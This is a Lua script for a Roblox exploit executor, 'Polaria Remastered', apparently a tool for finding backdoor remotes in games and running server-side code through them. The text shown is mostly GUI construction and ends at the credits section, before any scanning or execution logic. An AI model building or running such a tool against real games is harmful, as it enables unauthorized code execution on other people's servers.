if not game:IsLoaded() then 
    game.Loaded:Wait() 
end

local Shared = (function()
    local Success, Env = pcall(getgenv)
    return (Success and Env) or _G or (warn("[Shared]: Failed to access a usable global environment.") or {})
end)()

local function expect(expected, value, fallback)
    if type(value) == expected then
        return value
    end

    if fallback ~= nil then
        if type(fallback) == "function" then
            return function(...)
                warn("[Expect]: Missing executor functionality. Using fallback function.")
                return fallback(...)
            end
        end

        warn("[Expect]: Value has unexpected type. Using fallback value.")
    end

    return fallback
end

local cloneref = expect("function", cloneref, function(...) return ... end)

local Services = setmetatable({}, {
    __index = function(self, name)
        local success, cache = pcall(function()
            return cloneref(game:GetService(name))
        end)
        if success then
            rawset(self, name, cache)
            return cache
        else
            error("Invalid Service: " .. tostring(name))
        end
    end
})

local Success, Hui = pcall(function()
    return gethui and gethui()
end)

local CoreGui = Success and typeof(Hui) == "Instance" and Hui or Services.CoreGui

local Players = Services.Players
local Player = Players.LocalPlayer
local RunService = Services.RunService
local HttpService = Services.HttpService
local TweenService = Services.TweenService
local UserInputService = Services.UserInputService
local Stats = Services.Stats
local MarketplaceService = Services.MarketplaceService
local StarterGui = Services.StarterGui

local WriteFile = expect("function", writefile, function() return end)
local IsFile = expect("function", isfile, function() return end)
local IsFolder = expect("function", isfolder, function() return end)
local MakeFolder = expect("function", makefolder, function() return end)
local LoadAsset = expect("function", getcustomasset, expect("function", getsynasset, nil))

local Assets = {
    ["PolariaRM/Assets/polaria_logo.png"] = "https://raw.githubusercontent.com/JustSomeGuest/Scripts/main/Universal/PolariaRM/Assets/logo.png",
    ["PolariaRM/Assets/polaria_dev.png"] = "https://avatars.githubusercontent.com/u/279942568",
    ["PolariaRM/Assets/polaria_shadow.png"] = "rbxassetid://15298624572",
}

local function HttpGet(url)
    local RequestFunc = expect("function", syn and syn.request, 
        expect("function", request, 
            expect("function", http_request, nil)))
    
    if not RequestFunc then
        return nil
    end
    
    local success, result = pcall(function()
        return RequestFunc({
            Url = url,
            Method = "GET"
        })
    end)
    
    return success and result or nil
end

local function GetAsset(Path)
    if not LoadAsset then
        return nil
    end

    local Asset = Assets[Path]
    if not Asset then
        return nil
    end

    if not IsFolder("PolariaRM") then
        MakeFolder("PolariaRM")
    end

    if not IsFolder("PolariaRM/Assets") then
        MakeFolder("PolariaRM/Assets")
    end

    if Asset:match("^rbxassetid://") then
        return Asset
    end

    if not IsFile(Path) then
        local Success, Response = pcall(function()
            return HttpGet(Asset)
        end)

        if not Success or not Response or not Response.Success or not Response.Body then
            return nil
        end

        WriteFile(Path, Response.Body)
    end

    return LoadAsset(Path)
end

Shared.PolariaRM = Shared.PolariaRM or {}

if Shared.PolariaRM.isLoaded then
    Services.StarterGui:SetCore("SendNotification", {
        Title = "PolariaRM",
        Text = "Polaria Remastered is already running!",
        Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
        Duration = 4
    })
    return
end

Shared.PolariaRM.isLoaded = true

local backdoorRemote = nil
local currentContent = nil
local lastDT = 0
local serverStartTime = workspace:GetServerTimeNow()

local PolariaRM = Instance.new("ScreenGui")
PolariaRM.Name = "PolariaRM"
PolariaRM.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
PolariaRM.ResetOnSpawn = false
PolariaRM.Parent = CoreGui

local Show = Instance.new("ImageButton")
Show.Name = "Show"
Show.BorderSizePixel = 0
Show.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Show.Size = UDim2.new(0,40,0,40)
Show.Visible = false
Show.Position = UDim2.new(0, 20, 0, 6)
Show.Parent = PolariaRM

local ShowIcon = Instance.new("ImageLabel")
ShowIcon.Image = GetAsset("PolariaRM/Assets/polaria_logo.png")
ShowIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
ShowIcon.BackgroundTransparency = 1
ShowIcon.Size = UDim2.new(1,0,1,0)
ShowIcon.Position = UDim2.new(0,0,0,0)
ShowIcon.Parent = Show

local ShowIconGradient = Instance.new("UIGradient")
ShowIconGradient.Name = "ShowGradient"
ShowIconGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ShowIconGradient.Parent = ShowIcon

local ShowStroke = Instance.new("UIStroke")
ShowStroke.Name = "ShowStroke"
ShowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ShowStroke.Color = Color3.fromRGB(255, 255, 255)
ShowStroke.Parent = Show

local ShowStrokeGradient = Instance.new("UIGradient")
ShowStrokeGradient.Name = "ShowStrokeGradient"
ShowStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ShowStrokeGradient.Parent = ShowStroke

local ShowCorner = Instance.new("UICorner")
ShowCorner.Name = "ShowCorner"
ShowCorner.CornerRadius = UDim.new(1, 0)
ShowCorner.Parent = Show

local ShowGradient = Instance.new("UIGradient")
ShowGradient.Name = "ShowGradient"
ShowGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ShowGradient.Parent = Show

local ShowPadding = Instance.new("UIPadding")
ShowPadding.Name = "ShowPadding"
ShowPadding.PaddingTop = UDim.new(0, 5)
ShowPadding.PaddingRight = UDim.new(0, 5)
ShowPadding.PaddingLeft = UDim.new(0, 5)
ShowPadding.PaddingBottom = UDim.new(0, 5)
ShowPadding.Parent = Show

local Container = Instance.new("Frame")
Container.Name = "Container"
Container.BorderSizePixel = 0
Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Container.Size = UDim2.new(0.7, 0, 0.9, 0)
Container.Position = UDim2.new(0, 20, 0, 6)
Container.BackgroundTransparency = 1
Container.Parent = PolariaRM

local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.BorderSizePixel = 0
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.ImageTransparency = 0.2
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.Image = GetAsset("PolariaRM/Assets/polaria_shadow.png")
Shadow.Size = UDim2.new(1.059, 0, 1.088, 0)
Shadow.BackgroundTransparency = 1
Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
Shadow.Parent = Container

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.BorderSizePixel = 0
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Parent = Container

local MainFramePadding = Instance.new("UIPadding")
MainFramePadding.Name = "MainFramePadding"
MainFramePadding.PaddingTop = UDim.new(0, 4)
MainFramePadding.PaddingRight = UDim.new(0, 4)
MainFramePadding.PaddingLeft = UDim.new(0, 4)
MainFramePadding.PaddingBottom = UDim.new(0, 4)
MainFramePadding.Parent = MainFrame

local Contents = Instance.new("Frame")
Contents.Name = "Contents"
Contents.BorderSizePixel = 0
Contents.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Contents.Size = UDim2.new(1, 0, 1, 0)
Contents.LayoutOrder = 3
Contents.BackgroundTransparency = 1
Contents.Parent = MainFrame

local HomeContent = Instance.new("Frame")
HomeContent.Name = "HomeContent"
HomeContent.BorderSizePixel = 0
HomeContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HomeContent.Size = UDim2.new(1, 0, 1, 0)
HomeContent.LayoutOrder = 1
HomeContent.BackgroundTransparency = 1
HomeContent.Parent = Contents

local HomeStats = Instance.new("TextLabel")
HomeStats.Name = "HomeStats"
HomeStats.TextWrapped = true
HomeStats.BorderSizePixel = 0
HomeStats.TextXAlignment = Enum.TextXAlignment.Left
HomeStats.TextYAlignment = Enum.TextYAlignment.Top
HomeStats.TextScaled = true
HomeStats.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HomeStats.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
HomeStats.TextColor3 = Color3.fromRGB(255, 255, 255)
HomeStats.BackgroundTransparency = 1
HomeStats.RichText = true
HomeStats.Size = UDim2.new(0, 410, 0, 184)
HomeStats.Text = "Welcome, DisplayName! (@Username)\nFPS:\nPing:\nServer age:\nDevice:\nOS:\nExecutor:"
HomeStats.LayoutOrder = 2
HomeStats.Position = UDim2.new(0, 94, 0, 54)
HomeStats.Parent = HomeContent

local HomeStatsGradient = Instance.new("UIGradient")
HomeStatsGradient.Name = "HomeStatsGradient"
HomeStatsGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
HomeStatsGradient.Parent = HomeStats

local Headshot = Instance.new("ImageLabel")
Headshot.Name = "Headshot"
Headshot.BorderSizePixel = 0
Headshot.ScaleType = Enum.ScaleType.Fit
Headshot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Headshot.Size = UDim2.new(0, 90, 0, 90)
Headshot.BackgroundTransparency = 1
Headshot.LayoutOrder = 1
Headshot.Parent = HomeContent

local HeadshotSC = Instance.new("UISizeConstraint")
HeadshotSC.Name = "HeadshotSC"
HeadshotSC.MinSize = Vector2.new(80, 80)
HeadshotSC.MaxSize = Vector2.new(100, 100)
HeadshotSC.Parent = Headshot

local HeadshotStroke = Instance.new("UIStroke")
HeadshotStroke.Name = "HeadshotStroke"
HeadshotStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
HeadshotStroke.Color = Color3.fromRGB(255, 255, 255)
HeadshotStroke.Parent = Headshot

local HeadshotStrokeGradient = Instance.new("UIGradient")
HeadshotStrokeGradient.Name = "HeadshotStrokeGradient"
HeadshotStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
HeadshotStrokeGradient.Parent = HeadshotStroke

local HeadshotRatio = Instance.new("UIAspectRatioConstraint")
HeadshotRatio.Name = "HeadshotRatio"
HeadshotRatio.Parent = Headshot

local HeadshotCorner = Instance.new("UICorner")
HeadshotCorner.Name = "HeadshotCorner"
HeadshotCorner.CornerRadius = UDim.new(1, 0)
HeadshotCorner.Parent = Headshot

local HomeContentList = Instance.new("UIListLayout")
HomeContentList.Name = "HomeContentList"
HomeContentList.HorizontalFlex = Enum.UIFlexAlignment.Fill
HomeContentList.VerticalFlex = Enum.UIFlexAlignment.Fill
HomeContentList.Padding = UDim.new(0, 4)
HomeContentList.SortOrder = Enum.SortOrder.LayoutOrder
HomeContentList.FillDirection = Enum.FillDirection.Horizontal
HomeContentList.Parent = HomeContent

local ExeContent = Instance.new("Frame")
ExeContent.Name = "ExeContent"
ExeContent.Visible = false
ExeContent.BorderSizePixel = 0
ExeContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExeContent.Size = UDim2.new(1, 0, 1, 0)
ExeContent.LayoutOrder = 4
ExeContent.BackgroundTransparency = 1
ExeContent.Parent = Contents

local ExeContentBtns = Instance.new("Frame")
ExeContentBtns.Name = "ExeContentBtns"
ExeContentBtns.BorderSizePixel = 0
ExeContentBtns.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExeContentBtns.Size = UDim2.new(0, 0, 0, 34)
ExeContentBtns.LayoutOrder = 2
ExeContentBtns.BackgroundTransparency = 1
ExeContentBtns.Parent = ExeContent

local ExeContentBtnsList = Instance.new("UIListLayout")
ExeContentBtnsList.Name = "ExeContentBtnsList"
ExeContentBtnsList.HorizontalFlex = Enum.UIFlexAlignment.Fill
ExeContentBtnsList.VerticalFlex = Enum.UIFlexAlignment.Fill
ExeContentBtnsList.Padding = UDim.new(0, 6)
ExeContentBtnsList.SortOrder = Enum.SortOrder.LayoutOrder
ExeContentBtnsList.FillDirection = Enum.FillDirection.Horizontal
ExeContentBtnsList.Parent = ExeContentBtns

local Re = Instance.new("TextButton")
Re.Name = "Re"
Re.TextWrapped = true
Re.BorderSizePixel = 0
Re.TextColor3 = Color3.fromRGB(255, 255, 255)
Re.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Re.Size = UDim2.new(0, 120, 0, 36)
Re.LayoutOrder = 3
Re.Text = ""
Re.Parent = ExeContentBtns

local ReCorner = Instance.new("UICorner")
ReCorner.Name = "ReCorner"
ReCorner.CornerRadius = UDim.new(0, 4)
ReCorner.Parent = Re

local ReGradient = Instance.new("UIGradient")
ReGradient.Name = "ReGradient"
ReGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ReGradient.Parent = Re

local ReStroke = Instance.new("UIStroke")
ReStroke.Name = "ReStroke"
ReStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ReStroke.Color = Color3.fromRGB(255, 255, 255)
ReStroke.Parent = Re

local ReStrokeGradient = Instance.new("UIGradient")
ReStrokeGradient.Name = "ReStrokeGradient"
ReStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ReStrokeGradient.Parent = ReStroke

local ReContainer = Instance.new("Frame")
ReContainer.Name = "ReContainer"
ReContainer.Interactable = false
ReContainer.BorderSizePixel = 0
ReContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReContainer.Size = UDim2.new(1, 0, 1, 0)
ReContainer.BackgroundTransparency = 1
ReContainer.Parent = Re

local ReLabel = Instance.new("TextLabel")
ReLabel.Name = "ReLabel"
ReLabel.TextWrapped = true
ReLabel.BorderSizePixel = 0
ReLabel.TextScaled = true
ReLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ReLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ReLabel.BackgroundTransparency = 1
ReLabel.Size = UDim2.new(1, 0, 1, 0)
ReLabel.Text = "Refresh"
ReLabel.Parent = ReContainer

local ReLabelPadding = Instance.new("UIPadding")
ReLabelPadding.Name = "ReLabelPadding"
ReLabelPadding.PaddingTop = UDim.new(0, 4)
ReLabelPadding.PaddingRight = UDim.new(0, 4)
ReLabelPadding.PaddingLeft = UDim.new(0, 4)
ReLabelPadding.PaddingBottom = UDim.new(0, 4)
ReLabelPadding.Parent = ReLabel

local ExeContentBtnsSC = Instance.new("UISizeConstraint")
ExeContentBtnsSC.Name = "ExeContentBtnsSC"
ExeContentBtnsSC.MinSize = Vector2.new(0, 30)
ExeContentBtnsSC.MaxSize = Vector2.new(math.huge, 34)
ExeContentBtnsSC.Parent = ExeContentBtns

local Exe = Instance.new("TextButton")
Exe.Name = "Exe"
Exe.TextWrapped = true
Exe.BorderSizePixel = 0
Exe.TextColor3 = Color3.fromRGB(255, 255, 255)
Exe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exe.Size = UDim2.new(0, 120, 0, 36)
Exe.LayoutOrder = 1
Exe.Text = ""
Exe.Parent = ExeContentBtns

local ExeCorner = Instance.new("UICorner")
ExeCorner.Name = "ExeCorner"
ExeCorner.CornerRadius = UDim.new(0, 4)
ExeCorner.Parent = Exe

local ExeGradient = Instance.new("UIGradient")
ExeGradient.Name = "ExeGradient"
ExeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ExeGradient.Parent = Exe

local ExeStroke = Instance.new("UIStroke")
ExeStroke.Name = "ExeStroke"
ExeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ExeStroke.Color = Color3.fromRGB(255, 255, 255)
ExeStroke.Parent = Exe

local ExeStrokeGradient = Instance.new("UIGradient")
ExeStrokeGradient.Name = "ExeStrokeGradient"
ExeStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ExeStrokeGradient.Parent = ExeStroke

local ExeContainer = Instance.new("Frame")
ExeContainer.Name = "ExeContainer"
ExeContainer.Interactable = false
ExeContainer.BorderSizePixel = 0
ExeContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExeContainer.Size = UDim2.new(1, 0, 1, 0)
ExeContainer.BackgroundTransparency = 1
ExeContainer.Parent = Exe

local ExeLabel = Instance.new("TextLabel")
ExeLabel.Name = "ExeLabel"
ExeLabel.TextWrapped = true
ExeLabel.BorderSizePixel = 0
ExeLabel.TextScaled = true
ExeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExeLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ExeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ExeLabel.BackgroundTransparency = 1
ExeLabel.Size = UDim2.new(1, 0, 1, 0)
ExeLabel.Text = "Execute"
ExeLabel.Parent = ExeContainer

local ExeLabelPadding = Instance.new("UIPadding")
ExeLabelPadding.Name = "ExeLabelPadding"
ExeLabelPadding.PaddingTop = UDim.new(0, 4)
ExeLabelPadding.PaddingRight = UDim.new(0, 4)
ExeLabelPadding.PaddingLeft = UDim.new(0, 4)
ExeLabelPadding.PaddingBottom = UDim.new(0, 4)
ExeLabelPadding.Parent = ExeLabel

local Clr = Instance.new("TextButton")
Clr.Name = "Clr"
Clr.TextWrapped = true
Clr.BorderSizePixel = 0
Clr.TextColor3 = Color3.fromRGB(255, 255, 255)
Clr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Clr.Size = UDim2.new(0, 120, 0, 36)
Clr.LayoutOrder = 2
Clr.Text = ""
Clr.Parent = ExeContentBtns

local ClrCorner = Instance.new("UICorner")
ClrCorner.Name = "ClrCorner"
ClrCorner.CornerRadius = UDim.new(0, 4)
ClrCorner.Parent = Clr

local ClrGradient = Instance.new("UIGradient")
ClrGradient.Name = "ClrGradient"
ClrGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ClrGradient.Parent = Clr

local ClrStroke = Instance.new("UIStroke")
ClrStroke.Name = "ClrStroke"
ClrStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ClrStroke.Color = Color3.fromRGB(255, 255, 255)
ClrStroke.Parent = Clr

local ClrStrokeGradient = Instance.new("UIGradient")
ClrStrokeGradient.Name = "ClrStrokeGradient"
ClrStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ClrStrokeGradient.Parent = ClrStroke

local ClrContainer = Instance.new("Frame")
ClrContainer.Name = "ClrContainer"
ClrContainer.Interactable = false
ClrContainer.BorderSizePixel = 0
ClrContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClrContainer.Size = UDim2.new(1, 0, 1, 0)
ClrContainer.BackgroundTransparency = 1
ClrContainer.Parent = Clr

local ClrLabel = Instance.new("TextLabel")
ClrLabel.Name = "ClrLabel"
ClrLabel.TextWrapped = true
ClrLabel.BorderSizePixel = 0
ClrLabel.TextScaled = true
ClrLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClrLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ClrLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ClrLabel.BackgroundTransparency = 1
ClrLabel.Size = UDim2.new(1, 0, 1, 0)
ClrLabel.Text = "Clear"
ClrLabel.Parent = ClrContainer

local ClrLabelPadding = Instance.new("UIPadding")
ClrLabelPadding.Name = "ClrLabelPadding"
ClrLabelPadding.PaddingTop = UDim.new(0, 4)
ClrLabelPadding.PaddingRight = UDim.new(0, 4)
ClrLabelPadding.PaddingLeft = UDim.new(0, 4)
ClrLabelPadding.PaddingBottom = UDim.new(0, 4)
ClrLabelPadding.Parent = ClrLabel

local ExeContentList = Instance.new("UIListLayout")
ExeContentList.Name = "ExeContentList"
ExeContentList.HorizontalFlex = Enum.UIFlexAlignment.Fill
ExeContentList.VerticalFlex = Enum.UIFlexAlignment.Fill
ExeContentList.Padding = UDim.new(0, 6)
ExeContentList.SortOrder = Enum.SortOrder.LayoutOrder
ExeContentList.Parent = ExeContent

local InputFrame = Instance.new("ScrollingFrame")
InputFrame.Name = "InputFrame"
InputFrame.BorderSizePixel = 0
InputFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InputFrame.Size = UDim2.new(0.2, 0, 0.3, 0)
InputFrame.BackgroundTransparency = 1
InputFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
InputFrame.ScrollingDirection = Enum.ScrollingDirection.Y
InputFrame.ScrollBarThickness = 0
InputFrame.Parent = ExeContent

local InputFrameStroke = Instance.new("UIStroke")
InputFrameStroke.Name = "InputFrameStroke"
InputFrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
InputFrameStroke.Color = Color3.fromRGB(255, 255, 255)
InputFrameStroke.Parent = InputFrame

local InputFrameStrokeGradient = Instance.new("UIGradient")
InputFrameStrokeGradient.Name = "InputFrameStrokeGradient"
InputFrameStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
InputFrameStrokeGradient.Parent = InputFrameStroke

local InputFrameCorner = Instance.new("UICorner")
InputFrameCorner.Name = "InputFrameCorner"
InputFrameCorner.CornerRadius = UDim.new(0, 4)
InputFrameCorner.Parent = InputFrame

local InputBox = Instance.new("TextBox")
InputBox.Name = "InputBox"
InputBox.TextXAlignment = Enum.TextXAlignment.Left
InputBox.PlaceholderColor3 = Color3.fromRGB(83, 0, 255)
InputBox.BorderSizePixel = 0
InputBox.TextWrapped = true
InputBox.TextSize = 18
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.TextYAlignment = Enum.TextYAlignment.Top
InputBox.TextScaled = true
InputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InputBox.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
InputBox.AutomaticSize = Enum.AutomaticSize.Y
InputBox.PlaceholderText = "Server-side code here..."
InputBox.Size = UDim2.new(1, 0, 0, 0)
InputBox.Text = ""
InputBox.BackgroundTransparency = 1
InputBox.Parent = InputFrame

local InputBoxPadding = Instance.new("UIPadding")
InputBoxPadding.Name = "InputBoxPadding"
InputBoxPadding.PaddingTop = UDim.new(0, 4)
InputBoxPadding.PaddingRight = UDim.new(0, 4)
InputBoxPadding.PaddingLeft = UDim.new(0, 4)
InputBoxPadding.PaddingBottom = UDim.new(0, 4)
InputBoxPadding.Parent = InputBox

local InputBoxTextSC = Instance.new("UITextSizeConstraint")
InputBoxTextSC.Name = "InputBoxTextSC"
InputBoxTextSC.MaxTextSize = 20
InputBoxTextSC.MinTextSize = 18
InputBoxTextSC.Parent = InputBox

local ScannerContent = Instance.new("Frame")
ScannerContent.Name = "ScannerContent"
ScannerContent.Visible = false
ScannerContent.BorderSizePixel = 0
ScannerContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScannerContent.Size = UDim2.new(1, 0, 1, 0)
ScannerContent.LayoutOrder = 2
ScannerContent.BackgroundTransparency = 1
ScannerContent.Parent = Contents

local ScannerContentList = Instance.new("UIListLayout")
ScannerContentList.Name = "ScannerContentList"
ScannerContentList.HorizontalFlex = Enum.UIFlexAlignment.Fill
ScannerContentList.VerticalFlex = Enum.UIFlexAlignment.Fill
ScannerContentList.Padding = UDim.new(0, 4)
ScannerContentList.SortOrder = Enum.SortOrder.LayoutOrder
ScannerContentList.Parent = ScannerContent

local ScanBtn = Instance.new("TextButton")
ScanBtn.Name = "ScanBtn"
ScanBtn.TextWrapped = true
ScanBtn.BorderSizePixel = 0
ScanBtn.TextScaled = true
ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScanBtn.Size = UDim2.new(0, 48, 0, 48)
ScanBtn.LayoutOrder = 1
ScanBtn.Text = ""
ScanBtn.Parent = ScannerContent

local ScanBtnCorner = Instance.new("UICorner")
ScanBtnCorner.Name = "ScanBtnCorner"
ScanBtnCorner.CornerRadius = UDim.new(0, 4)
ScanBtnCorner.Parent = ScanBtn

local ScanBtnGradient = Instance.new("UIGradient")
ScanBtnGradient.Name = "ScanBtnGradient"
ScanBtnGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScanBtnGradient.Parent = ScanBtn

local ScanBtnContainer = Instance.new("Frame")
ScanBtnContainer.Name = "ScanBtnContainer"
ScanBtnContainer.Interactable = false
ScanBtnContainer.BorderSizePixel = 0
ScanBtnContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScanBtnContainer.Size = UDim2.new(1, 0, 1, 0)
ScanBtnContainer.BackgroundTransparency = 1
ScanBtnContainer.Parent = ScanBtn

local ScanLabel = Instance.new("TextLabel")
ScanLabel.Name = "ScanLabel"
ScanLabel.TextWrapped = true
ScanLabel.BorderSizePixel = 0
ScanLabel.TextScaled = true
ScanLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScanLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ScanLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanLabel.BackgroundTransparency = 1
ScanLabel.Size = UDim2.new(1, 0, 1, 0)
ScanLabel.Text = "Scan"
ScanLabel.Parent = ScanBtnContainer

local ScanLabelPadding = Instance.new("UIPadding")
ScanLabelPadding.Name = "ScanLabelPadding"
ScanLabelPadding.PaddingTop = UDim.new(0, 6)
ScanLabelPadding.PaddingRight = UDim.new(0, 6)
ScanLabelPadding.PaddingLeft = UDim.new(0, 6)
ScanLabelPadding.PaddingBottom = UDim.new(0, 6)
ScanLabelPadding.Parent = ScanLabel

local ScanBtnStroke = Instance.new("UIStroke")
ScanBtnStroke.Name = "ScanBtnStroke"
ScanBtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
ScanBtnStroke.Color = Color3.fromRGB(255, 255, 255)
ScanBtnStroke.Parent = ScanBtn

local ScanBtnStrokeGradient = Instance.new("UIGradient")
ScanBtnStrokeGradient.Name = "ScanBtnStrokeGradient"
ScanBtnStrokeGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScanBtnStrokeGradient.Parent = ScanBtnStroke

local ScanBtnSC = Instance.new("UISizeConstraint")
ScanBtnSC.Name = "ScanBtnSC"
ScanBtnSC.MinSize = Vector2.new(0, 46)
ScanBtnSC.MaxSize = Vector2.new(math.huge, 50)
ScanBtnSC.Parent = ScanBtn

local ScanStatus = Instance.new("TextLabel")
ScanStatus.Name = "ScanStatus"
ScanStatus.TextWrapped = true
ScanStatus.BorderSizePixel = 0
ScanStatus.TextSize = 22
ScanStatus.TextXAlignment = Enum.TextXAlignment.Left
ScanStatus.TextYAlignment = Enum.TextYAlignment.Top
ScanStatus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanStatus.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
ScanStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanStatus.BackgroundTransparency = 1
ScanStatus.Size = UDim2.new(0, 456, 0, 184)
ScanStatus.Text = "Ready to scan for backdoors..."
ScanStatus.LayoutOrder = 2
ScanStatus.Position = UDim2.new(0, 0, 0, 54)
ScanStatus.Parent = ScannerContent

local ScanStatusGradient = Instance.new("UIGradient")
ScanStatusGradient.Name = "ScanStatusGradient"
ScanStatusGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
ScanStatusGradient.Parent = ScanStatus

local CreditsContent = Instance.new("Frame")
CreditsContent.Name = "CreditsContent"
CreditsContent.Visible = false
CreditsContent.BorderSizePixel = 0
CreditsContent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsContent.Size = UDim2.new(1, 0, 1, 0)
CreditsContent.LayoutOrder = 5
CreditsContent.BackgroundTransparency = 1
CreditsContent.Parent = Contents

local CreditsContentList = Instance.new("UIListLayout")
CreditsContentList.Name = "CreditsContentList"
CreditsContentList.HorizontalFlex = Enum.UIFlexAlignment.Fill
CreditsContentList.VerticalFlex = Enum.UIFlexAlignment.Fill
CreditsContentList.Padding = UDim.new(0, 4)
CreditsContentList.SortOrder = Enum.SortOrder.LayoutOrder
CreditsContentList.FillDirection = Enum.FillDirection.Horizontal
CreditsContentList.Parent = CreditsContent

local DevHeadshot = Instance.new("ImageLabel")
